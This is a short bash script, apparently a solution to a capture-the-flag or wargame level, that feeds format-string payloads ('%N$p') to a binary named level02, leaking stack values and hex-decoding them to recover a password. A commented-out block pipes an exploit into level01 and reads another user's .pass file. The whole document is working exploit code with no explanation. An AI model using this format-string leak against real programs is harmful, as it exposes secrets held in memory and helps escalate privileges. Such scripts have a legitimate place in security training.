#!/bin/bash

i="0"
username=""

while [ $i -lt 30 ] && [ ${#username} -ne 41 ]
do
    echo -e "%$i\$p %$i\$p\n+password" > /tmp/exploit02
    username=`cat /tmp/exploit02 | ~/level02 | grep "access\!" | cut -d' ' -f1`
    decoded=`echo $username | xxd -r | LC_ALL=C rev`
    # echo "%$i\$s: $decoded"
    printf "%%%d\$p: %.*s\t=>\t%s\n" $i, 20, $username, $decoded
    echo -e "%$i\$p: $username\t=>\t$decoded"
    i=$[$i+1]
    sleep 0.2
done


echo $username

# set -x
# (buildExploit; cat /tmp/exploit01 - | ~/level01) << EOI
#     echo "\nwhoami: \$(whoami)"
#     echo "Next pass is:  \$(cat /home/users/level02/.pass)"
# EOI